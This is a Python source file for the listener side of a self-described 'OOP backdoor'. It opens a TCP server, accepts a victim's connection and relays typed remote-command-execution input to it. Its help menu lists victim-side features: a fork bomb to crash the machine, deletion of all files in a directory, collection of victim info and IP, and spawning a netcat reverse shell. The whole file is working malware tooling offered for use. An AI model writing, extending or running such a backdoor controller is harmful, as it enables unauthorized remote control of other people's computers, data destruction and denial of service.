import socket
import sys
import time
import os
import subprocess
### Server

class TcpServer:


    def __init__(self):
        # Font: Chuncky
        print("""\033[1;36m
 _______               __         __ __   
|    ___|.--.--.-----.|  |.-----.|__|  |_ 
|    ___||_   _|  _  ||  ||  _  ||  |   _|
|_______||__.__|   __||__||_____||__|____|
               |__|    \033[0;0m""")
        try:
            self.host = input("\033[1;36mPut here the LHOST IP:\033[0;0m ")
            self.port = int(input("\033[1;36mPut here the LHOST Port:\033[0;0m "))

            if self.host == "":
                print("\033[1;36mNo host Especified! Exiting...\033[0;0m")
                sys.exit()
                
            self.hostname = socket.gethostname()

        except KeyboardInterrupt:
            print("\nExiting... Bye o/")
            sys.exit()
        

    def starting_connection(self):
        # exploiting_string = "Launching Server..."

        exploit = ["L","a","u","n","c","h","i","n","g"," ","S","e","r","v","e","r",".",".","."]

        # display with one upper char

        for x in range(len(exploit)):
            # remeber lower char
            old = exploit[x]

            # replace with upper char
            exploit[x] = old.upper()

            # create full text
            text = "".join(exploit)

            # display full text
            sys.stdout.write("\r")
            sys.stdout.write(f"\033[1;36m{text}\033[0;0m")
            sys.stdout.flush()

            # put back lower char
            exploit[x] = old

            time.sleep(0.2)

        # display without upper chars at the end 

        text = "".join(exploit)

        sys.stdout.write("\r")
        sys.stdout.write(f"\033[1;36m{text}\033[0;0m")
        sys.stdout.flush()
        print("""\n\033[1;32m 
        
                      _     __,..---""-._                 ';-,
        ,    _/_),-"`             '-.                `\\
       \|.-"`    -_)                 '.                ||
       /`   a   ,                      \              .'/
       '.___,__/                 .-'    \_        _.-'.'
          |\  \      \         /`        _`""""""`_.-'
             _/;--._, >        |   --.__/ `""""""`
           (((-'  __//`'-......-;\      )
                (((-'       __//  '--. /
        jgs               (((-'    __//
                                 (((-'\033[0;0m

+------------------------------------------------------------+
| \033[1;31m* Python based OOP backdoor made by --> f3rr3ira\033[0;0m           |
+------------------------------------------------------------+
| \033[1;31m* version 1.0\033[0;0m                                              |
| \033[1;31m* Github --> https://github.com/ferreiraklet\033[0;0m               |
| \033[1;31m* Type list For Help\033[0;0m                                       |
+------------------------------------------------------------+
""")
    

    def show_connection(self):
        time.sleep(0.5)
        print(f"\033[1;32m[+]\033[0;0m --> Server Started on {self.host}!")
        print("\033[1;32m[+]\033[0;0m --> Listening For Client Connection...")

    def sending_commands(self):
        
        # Binding stuff
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.settimeout(None)
            self.server.bind((self.host, self.port))

            self.server.listen(1)

        except KeyboardInterrupt:
            print("Exiting... Bye o/")
            sys.exit()

        except socket.error:
            print("\n\033[1;31m[!]\033[0;0m Server is not responding or doesn't exist")
            sys.exit()

        time.sleep(0.5)
        # print("[+] \033[1;32m--> Starting RCE input -->\033[0;0m\n\n")
        print("\n\033[31m[+] * \033[0;0mType list for command list\n\033[31m[+] * \033[0;0mWaiting for connection...")
        while True:
            try:
                self.client, self.client_ip = self.server.accept()
                print(f"\n\033[1;36mConnection Received from {self.client_ip}\033[0;0m\n")
                print("\033[1;32m[+]\033[0;0m --> Starting RCE input -->\n\n")

            except KeyboardInterrupt:
                print("\nExiting... Bye o/")
                sys.exit()

            while True:
                # Input for terminal commands
                
                
                # o input ta quebrando com o cat, porque o input aparece mais rapido que o resultado inteiro do cat
                try:
                    message_command = input('\033[1;36mEnter RCE Command:\033[0;0m ')
                    
                    # Exiting keyword
                    if message_command == "exit":
                        print("Closing RCE... Bye o/")
                        self.client.send("exit".encode())
                        self.server.close()
                        sys.exit()

                    """if message_command == "keylogger_stop":
                        # self.client.send("keylogger_stop".encode())
                        print("Backdoor session finished! Exiting... o/")
                        sys.exit()"""

                    # Command listing

                    if message_command == "list":
                        print("""
            \033[1;31mforkbomb --> Crash Target's machine
            victims_info --> Get some Target's info
            get_ip --> Get Target's ip
            remove_all --> Removes all files in currently directory
            reverse_tcp --> NetCat feature: Spawn Reverse TCP shell into specified IP and PORT\033[0;0m
                        """)
                        continue

                    if message_command == "":
                        print("\n\033[1;36mMissing command!\033[0;0m")
                        continue

                    # Clear messages in currently cmd's session
                        
                    if message_command == "clear" and sys.platform.startswith("Linux") == True:
                        os.popen("clear")
                        continue
                    if message_command == "clear"and sys.platform.startswith("Windows") == True:
                        subprocess.Popen(f"cls", stderr=subprocess.PIPE,stdout=subprocess.PIPE,stdin=subprocess.PIPE, shell=True)
                        continue
                                
                    message_command_encrypted = message_command.encode()
                    self.client.send(message_command_encrypted)
                    print('* Command sent!')
                    receive_message = self.client.recv(1024)
                    descrypt_message = receive_message.decode("utf-8")
                    print(f"{descrypt_message}")

                    #if message_command.startswith("cat"):
                        #time.sleep(5)
                except KeyboardInterrupt:
                    print("\nExiting... Bye o/")
                    sys.exit()

                #self.client.close()

            # self.server.close()


object = TcpServer() # IP and PORT for the Server
object.starting_connection()
object.show_connection()
object.sending_commands()
